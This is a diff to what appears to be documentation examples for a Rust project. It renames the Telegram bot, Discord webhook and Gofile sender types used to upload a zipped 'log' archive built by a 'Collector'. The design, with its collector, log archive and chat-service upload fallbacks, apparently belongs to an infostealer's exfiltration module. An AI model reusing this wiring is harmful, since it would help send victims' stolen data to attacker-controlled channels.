@@ -171,13 +171,13 @@ Upload to the telegram
 use collector::Collector;
 use sender::{LogSenderExt, SendError};
 use zip::ZipArchive;
-use sender::telegram_bot::TelegramBot;
+use sender::telegram_bot::TelegramBotSender;
 
 pub fn upload_telegram<C>(chat_id: &str, bot: &str, log_filename: Arc<str>, zip: ZipArchive, collector: &C) -> Result<(), SendError>
 where
     C: Collector
 {
-    TelegramBot::new(Arc::from(chat_id), Arc::from(bot))
+    TelegramBotSender::new(Arc::from(chat_id), Arc::from(bot))
         .send_archive(log_filename, zip, collector)
 }
 ```
@@ -186,8 +186,8 @@ Uploads a log to a Discord webhook, with a fallback to Gofile if the archive exc
 ```rust
 use collector::Collector;
 use sender::{LogSenderExt, SendError};
-use sender::discord_webhook::DiscordWebhook;
-use sender::gofile::Gofile;
+use sender::discord_webhook::DiscordWebhookSender;
+use sender::gofile::GofileUploader;
 use sender::size_fallback::SizeFallbackSender;
 use zip::ZipArchive;
 
@@ -195,8 +195,8 @@ pub fn upload_discord<C>(webhook: &str, log_filename: Arc<str>, zip: ZipArchive,
 where 
     C: Collector
 {
-    let discord = DiscordWebhook::new(Arc::from(webhook));
-    let gofile = Gofile::new(discord.clone());
+    let discord = DiscordWebhookSender::new(Arc::from(webhook));
+    let gofile = GofileUploader::new(discord.clone());
     
     SizeFallbackSender::new(discord, gofile)
         .send_archive(log_filename, zip, collector)
